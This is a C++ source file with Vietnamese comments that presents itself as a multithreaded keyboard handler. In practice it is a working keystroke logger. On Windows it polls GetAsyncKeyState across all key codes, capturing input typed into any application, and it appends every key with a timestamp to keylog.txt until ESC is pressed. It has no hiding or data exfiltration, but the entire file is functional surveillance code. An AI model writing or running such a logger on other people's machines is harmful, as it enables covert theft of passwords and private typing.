// Header định nghĩa mã phím đa nền tảng (Windows/Linux)
// Chứa các hằng số KEY_* được định nghĩa cho từng hệ điều hành
#include "keycodes.hpp"

#ifdef _WIN32
#include <Windows.h>
#else
#include <ncurses.h>
#endif
#include <queue>
#include <thread>
#include <mutex>
#include <atomic>
#include <condition_variable>
#include <fstream>
#include <ios>
#include <ostream>
#include <chrono>
#include <ctime>
#include <string.h>
#include <iostream>

/*
 * Lớp chính quản lý bàn phím đa luồng
 * Sử dụng mô hình Producer-Consumer với:
 * - 1 luồng sản xuất (quét trạng thái phím)
 * - 1 luồng tiêu thụ (xử lý sự kiện phím)
 * Đồng bộ hóa bằng mutex và condition variable
 */
class KeyboardHandler {
    std::queue<int> keyQueue;
    std::mutex mtx;
    std::condition_variable cv;
    std::atomic<bool> running{true};
    
    // Vòng lặp chính quét phím với chu kỳ 10ms
// Sử dụng mảng keyStates để phát hiện sự kiện nhấn phím (edge detection)
// Sử dụng GetAsyncKeyState trên Windows và getch() trên Linux
/*
 * Luồng sản xuất: Liên tục quét trạng thái phím
 * Trên Windows: Dùng GetAsyncKeyState quét 255 phím
 * Trên Linux: Dùng getch() từ thư viện ncurses
 * Phát hiện sự kiện nhấn phím (chuyển trạng thái 0->1)
 * Đẩy sự kiện vào hàng đợi và thông báo qua condition variable
 */
void producerThread() {
        while(running) {
            while(running) {
                #ifdef _WIN32
                /* Key 0x1: mouse left, key 0x2: mouse right */
                for(int key = 1; key < 256; ++key) { // Bắt đầu từ 1 để bỏ qua key 0
                    static bool keyStates[256] = {false};
                    bool currentState = (GetAsyncKeyState(key) & 0x8000) != 0;
                    
                    if(currentState && !keyStates[key]) {
                        std::unique_lock<std::mutex> lock(mtx);
                        keyQueue.push(key);
                        cv.notify_one();
                    }
                    keyStates[key] = currentState;
                }
                #elif __linux__
                int ch = getch();
                if(ch != ERR) {
                    std::unique_lock<std::mutex> lock(mtx);
                    keyQueue.push(ch);
                    cv.notify_one();
                }
                #endif
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
        }
    }

    // Sử dụng wait() với predicate kiểm tra hàng đợi
// Mỗi lần lấy 1 sự kiện từ hàng đợi để xử lý tuần tự
// Sử dụng condition variable để chờ sự kiện
/*
 * Luồng tiêu thụ: Chờ và xử lý sự kiện từ hàng đợi
 * Sử dụng condition variable để chờ có dữ liệu
 * Mỗi sự kiện được xử lý tuần tự bằng handleKeyEvent
 * Đảm bảo thread-safe khi truy cập hàng đợi
 */
void consumerThread() {
        while(running) {
            std::unique_lock<std::mutex> lock(mtx);
            cv.wait(lock, [this]{ return !keyQueue.empty() || !running; });
            
            while(!keyQueue.empty()) {
                int key = keyQueue.front();
                keyQueue.pop();
                lock.unlock();
                
                // Xử lý sự kiện phím
                handleKeyEvent(key);
                
                lock.lock();
            }
        }
    }

    // Ghi log theo cơ chế append với mutex bảo vệ
// Định dạng log: [timestamp] Key pressed: <tên phím>
// Sử dụng mutex để đảm bảo thread-safe khi ghi file
/*
 * Chuyển đổi mã phím thành tên phím tương ứng
 * Sử dụng keycodes.hpp cho các phím đặc biệt
 * Hỗ trợ cả ký tự ASCII và mã hex
 */
std::string getKeyName(int keyCode) {
#ifdef _WIN32
    switch(keyCode) {
        case KEY_MOUSE_LEFT: return "Mouse Left";
        case KEY_MOUSE_RIGHT: return "Mouse Right";
        case KEY_SHIFT: return "Shift";
        case KEY_CONTROL: return "Control";
        case KEY_ALT: return "Alt";
        case KEY_SPACE: return "Space";
        default: 
            if(keyCode >= 'A' && keyCode <= 'Z') 
                return std::string("'") + static_cast<char>(keyCode) + "'";
            return "0x" + std::to_string(keyCode);
    }
#else
    if(keyCode >= 'A' && keyCode <= 'Z') 
        return std::string("'") + static_cast<char>(keyCode) + "'";
    return "0x" + std::to_string(keyCode);
#endif
}

/*
 * Xử lý sự kiện phím: Ghi log và kiểm tra phím thoát
 * Ghi file log với timestamp và tên phím
 * Sử dụng mutex riêng cho việc ghi file
 * Xử lý phím ESCAPE để kích hoạt dừng chương trình
 */
void handleKeyEvent(int keyCode) {
        static std::mutex logMtx;
        std::unique_lock<std::mutex> logLock(logMtx);
        
        // Ghi log với timestamp
        auto now = std::chrono::system_clock::now();
        std::time_t time = std::chrono::system_clock::to_time_t(now);
        
        std::ofstream logFile("keylog.txt", std::ios::app);
        if(logFile.is_open()) {
            logFile << "[" << std::ctime(&time) << "] Key pressed: " << getKeyName(keyCode) << std::endl;
        }
        
        // Xử lý phím ESC để thoát
#ifdef _WIN32
        if(keyCode == KEY_ESCAPE) {
#else
        if(keyCode == KEY_ESCAPE) {  // Sử dụng hằng số từ keycodes.hpp
#endif
            stop();
        }
    }

public:
    bool isRunning() const { return running; }
    void start() {
        std::thread producer(&KeyboardHandler::producerThread, this);
        std::thread consumer(&KeyboardHandler::consumerThread, this);
        producer.detach();
        consumer.detach();
    }

    void stop() {
        running = false;
        cv.notify_all();
    }
};

/*
 * Hàm main - Điểm vào chương trình
 * Thực hiện:
 * 1. Khởi tạo môi trường nhập phím (ncurses trên Linux)
 * 2. Tạo và khởi chạy bộ xử lý bàn phím
 * 3. Duy trì vòng lặp chính với chu kỳ kiểm tra 1s
 * 4. Dọn dẹp tài nguyên khi kết thúc
 * Đảm bảo xử lý đa nền tảng cho cả Windows và Linux
 */
int main() {
#ifdef __linux__
    initscr();
    cbreak();
    noecho();
    nodelay(stdscr, TRUE);
#endif
    KeyboardHandler handler;
    handler.start();
    
    // Giữ chương trình chạy
    while(handler.isRunning()) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    handler.stop();
#ifdef __linux__
    endwin();
#endif
    return 0;
}